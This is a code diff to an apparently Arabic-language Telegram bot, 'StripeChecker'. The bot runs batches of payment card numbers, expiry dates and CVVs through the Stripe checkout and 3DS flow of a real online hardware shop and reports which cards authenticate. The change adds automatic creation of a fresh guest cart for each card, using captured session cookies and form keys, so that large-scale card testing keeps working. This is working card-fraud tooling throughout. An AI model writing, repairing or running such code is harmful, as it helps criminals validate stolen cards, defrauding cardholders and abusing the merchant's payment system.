@@ -45,8 +45,116 @@ class StripeChecker:
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         }
         
+    def create_new_cart(self):
+        """إنشاء سلة جديدة والحصول على quoteId"""
+        try:
+            cookies = {
+                'store_switcher_popup_closed': 'closed',
+                'store': 'default',
+                'geoip_store_code': 'default',
+                'searchReport-log': '0',
+                '_ga': 'GA1.1.1117311913.1762822685',
+                '_fbp': 'fb.1.1762822684983.555449526293831509',
+                'form_key': 'slSdPjvgeIrs2Jbv',
+                'mage-cache-storage': '{}',
+                'mage-cache-storage-section-invalidation': '{}',
+                'mage-messages': '',
+                'recently_viewed_product': '{}',
+                'recently_viewed_product_previous': '{}',
+                'recently_compared_product': '{}',
+                'recently_compared_product_previous': '{}',
+                'product_data_storage': '{}',
+                'currency_code': 'GBP',
+                'twk_idm_key': 'If05Y4iPf8GjS1U3HQ2KA',
+                'PHPSESSID': 'vrpcdoq0uac8mpci1cgqeo8jr2',
+                'mage-cache-sessid': 'true',
+                '__stripe_mid': 'dbf99062-2426-4422-aeaa-5281ab702aad274b35',
+                '__stripe_sid': '66f0a1c2-42eb-498f-908e-64249c618bdeab244f',
+                'wp_customerGroup': 'NOT%20LOGGED%20IN',
+                '_gcl_au': '1.1.128175039.1762822685.606519831.1762822689.1762823296',
+            }
+
+            headers = {
+                'accept': 'application/json, text/javascript, */*; q=0.01',
+                'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+                'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryzpgjYWHuq3LNOAfe',
+                'dnt': '1',
+                'origin': 'https://www.ironmongeryworld.com',
+                'priority': 'u=1, i',
+                'referer': 'https://www.ironmongeryworld.com/air-bricks-vents-trivets/round-circle-hit-miss-sliding-vent-antique-iron.html',
+                'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
+                'x-requested-with': 'XMLHttpRequest',
+            }
+
+            files = {
+                'product': (None, '16484'),
+                'selected_configurable_option': (None, ''),
+                'related_product': (None, ''),
+                'item': (None, '16484'),
+                'form_key': (None, 'slSdPjvgeIrs2Jbv'),
+                'qty': (None, '1'),
+            }
+
+            response = self.session.post(
+                'https://www.ironmongeryworld.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuaXJvbm1vbmdlcnl3b3JsZC5jb20vYWlyLWJyaWNrcy12ZW50cy10cml2ZXRzL3JvdW5kLWNpcmNsZS1oaXQtbWlzcy1zbGlkaW5nLXZlbnQtYW50aXF1ZS1pcm9uLmh0bWw%2C/product/16484/',
+                cookies=cookies,
+                headers=headers,
+                files=files,
+            )
+
+            # الحصول على معلومات السلة
+            params = {
+                'sections': 'cart',
+                'force_new_section_timestamp': 'false',
+                '_': str(int(datetime.now().timestamp() * 1000)),
+            }
+
+            cart_response = self.session.get(
+                'https://www.ironmongeryworld.com/customer/section/load/',
+                params=params,
+                cookies=cookies,
+                headers={
+                    'accept': 'application/json, text/javascript, */*; q=0.01',
+                    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+                    'dnt': '1',
+                    'priority': 'u=1, i',
+                    'referer': 'https://www.ironmongeryworld.com/checkout/cart/',
+                    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-origin',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
+                    'x-requested-with': 'XMLHttpRequest',
+                }
+            )
+
+            cart_data = cart_response.json()
+            
+            if 'cart' in cart_data and 'mpquickcart' in cart_data['cart'] and 'quoteId' in cart_data['cart']['mpquickcart']:
+                quote_id = cart_data['cart']['mpquickcart']['quoteId']
+                return quote_id
+            else:
+                return None
+                
+        except Exception as e:
+            print(f"[!] Error creating cart: {e}")
+            return None
+        
     def check(self, card_number, exp_month, exp_year, cvv):
         try:
+            # إنشاء سلة جديدة والحصول على quoteId
+            quote_id = self.create_new_cart()
+            if not quote_id:
+                return 'ERROR', 'Failed to create new cart'
+            
             headers = self.headers.copy()
             headers.update({
                 'content-type': 'application/x-www-form-urlencoded',
@@ -70,7 +178,7 @@ class StripeChecker:
             })
             
             payload = {
-                'cartId': 'edzK67LvMFpBjxIzEzdIHrizSX8anM1g',
+                'cartId': quote_id,  # استخدام الـ quoteId الجديد
                 'billingAddress': {
                     'countryId': 'US',
                     'regionId': '13',
@@ -88,7 +196,7 @@ class StripeChecker:
                 'email': 'test@test.com',
             }
             
-            r = self.session.post('https://www.ironmongeryworld.com/rest/default/V1/guest-carts/edzK67LvMFpBjxIzEzdIHrizSX8anM1g/payment-information', headers=headers, json=payload)
+            r = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{quote_id}/payment-information', headers=headers, json=payload)
             res = r.json()
             if 'message' not in res or 'pi_' not in res['message']:
                 return 'DECLINED', 'Payment intent creation failed'
@@ -144,13 +252,11 @@ class StripeChecker:
                 if status == 'R':
                     return 'DECLINED', 'Rejected by issuer'
                 
-                # إذا كانت الحالة C، نفحص الـ Challenge
                 if status == 'C' and 'creq' in auth and 'ares' in auth and 'acsURL' in auth['ares']:
                     try:
                         creq = auth['creq']
                         acs_url = auth['ares']['acsURL']
                         
-                        # إعداد headers مع cookies للطلب
                         challenge_headers = {
                             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                             'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
@@ -172,7 +278,6 @@ class StripeChecker:
                         
                         challenge_data = {'creq': creq}
                         
-                        # إرسال الطلب
                         challenge_response = self.session.post(
                             acs_url,
                             headers=challenge_headers,
@@ -181,10 +286,8 @@ class StripeChecker:
                             allow_redirects=True
                         )
                         
-                        # فحص الرد
                         html_response = challenge_response.text
                         
-                        # فحص جميع حالات الفشل
                         failure_keywords = [
                             'Authentication failed',
                             'authentication failed',
@@ -198,7 +301,6 @@ class StripeChecker:
                             return 'FAILED_AUTH', 'Authentication failed in challenge'
                         
                     except Exception as e:
-                        # لو حصل خطأ في الفحص، نكمل عادي ونعتبرها C
                         pass
                 
                 return status, f'3DS Status: {status}'
@@ -471,7 +573,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "❌ N - Not Authenticated\n"
         "🔴 U - Unavailable\n"
         "❌ Declined/Rejected (R)\n"
-        "❌ Failed Auth - فشل المصادقة",
+        "❌ Failed Auth - فشل المصادقة\n\n"
+        "🆕 **السلة تتجدد تلقائياً لكل بطاقة!**",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
@@ -522,7 +625,8 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         f"✅ تم بدء الفحص!\n\n"
         f"📊 إجمالي البطاقات: {len(cards)}\n"
-        f"🔄 جاري الفحص...",
+        f"🔄 جاري الفحص...\n"
+        f"🆕 السلة تتجدد تلقائياً لكل بطاقة!",
         parse_mode='Markdown'
     )
     
@@ -555,9 +659,9 @@ async def process_cards(cards, bot_app):
     await update_dashboard(bot_app)
     
     summary_text = (
-        "━━━━━━━━━━━━━━━━━━━\n"
+        "┌──────────────────┐\n"
         "✅ **اكتمل الفحص!** ✅\n"
-        "━━━━━━━━━━━━━━━━━━━\n\n"
+        "└──────────────────┘\n\n"
         f"📊 **الإحصائيات النهائية:**\n"
         f"🔥 الإجمالي: {stats['total']}\n"
         f"✅ Authenticated (Y): {stats['authenticated']}\n"
@@ -585,7 +689,8 @@ async def process_cards(cards, bot_app):
         "╚═══════════════════╝\n\n"
         "✅ تم إرسال جميع الملفات\n"
         "📊 شكراً لاستخدامك البوت!\n\n"
-        "⚡️ Stripe 3DS Gateway"
+        "⚡️ Stripe 3DS Gateway\n"
+        "🆕 Dynamic Cart System"
     )
     
     await bot_app.bot.send_message(
@@ -631,6 +736,7 @@ def main():
     print("[✅] Bot will send results in chat (no channel)")
     print("[✅] Using asyncio.create_task (no threading)")
     print("[✅] Failed Authentication detection enabled")
+    print("[🆕] Dynamic Cart System - New cart for each check!")
     
     app = Application.builder().token(BOT_TOKEN).build()
     
